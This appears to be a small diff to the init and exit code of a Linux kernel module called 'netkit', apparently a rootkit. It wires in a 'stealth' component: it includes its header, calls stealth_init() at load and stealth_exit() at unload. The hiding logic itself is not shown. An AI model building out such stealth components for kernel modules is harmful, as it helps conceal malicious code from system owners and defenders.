@@ -4,6 +4,7 @@
 
 #include "netkit.h"
 
+#include "stealth/iface.h"
 #include "io/iface.h"
 
 struct module *netkit_module;
@@ -19,6 +20,13 @@ static int __init netkit_init(void)
     // if fails, directly exit module
     netkit_module = THIS_MODULE;
 
+    retv = stealth_init();
+    if (retv < 0)
+    {
+        pr_err("[!] failed to start stealth (err: %d)\n", retv);
+        return 0;
+    }
+
     retv = io_init();
     if (retv < 0)
         pr_err("[!] failed to start IO (err: %d)\n", retv);
@@ -31,6 +39,7 @@ static void __exit netkit_exit(void)
     pr_err("[*] stopping module...\n");
 
     io_exit();
+    stealth_exit();
 }
 
 module_init(netkit_init);
